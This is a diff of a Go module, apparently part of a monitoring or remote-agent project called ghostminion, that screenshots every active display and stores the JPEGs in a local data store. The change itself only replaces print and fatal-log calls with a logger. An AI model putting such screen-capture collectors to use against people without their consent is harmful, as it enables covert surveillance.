@@ -2,12 +2,10 @@ package apps
 
 import (
 	"bytes"
-	"fmt"
 	"ghostminion/db"
 	"github.com/kbinani/screenshot"
 	"image"
 	"image/jpeg"
-	"log"
 	"sync"
 	"time"
 )
@@ -38,7 +36,7 @@ func (c *ScreenshotApp) Validate() error {
 func (c *ScreenshotApp) runScreenshot() {
 	numOfActiveDisplays := screenshot.NumActiveDisplays()
 	if numOfActiveDisplays <= 0 {
-		log.Fatalf("Active display not found")
+		lgr.Error("No active displays found")
 		return
 	}
 
@@ -48,20 +46,20 @@ func (c *ScreenshotApp) runScreenshot() {
 		bounds := screenshot.GetDisplayBounds(i)
 		all = bounds.Union(all)
 		captureTime := time.Now().Unix()
-		fmt.Println("Screenshot captured at ", captureTime, " for display ", i)
+		lgr.Info("Screenshot captured at", captureTime, " for display ", i)
 		img, err := screenshot.CaptureRect(bounds)
 		if err != nil {
-			fmt.Printf("error: %v", err)
+			lgr.Error("Error capturing screenshot: ", err)
 			continue
 		}
 		var buf bytes.Buffer
 		err = jpeg.Encode(&buf, img, &jpeg.Options{Quality: 80})
 		if err != nil {
-			fmt.Printf("error: %v", err)
+			lgr.Error("Error encoding jpeg image: ", err)
 		}
 		err = db.WriteDataRow("", db.ScreenshotsDataType, buf.Bytes()) // replace requestId
 		if err != nil {
-			fmt.Printf("error: %v", err)
+			lgr.Error("Error writing file data: ", err)
 		}
 	}
 }
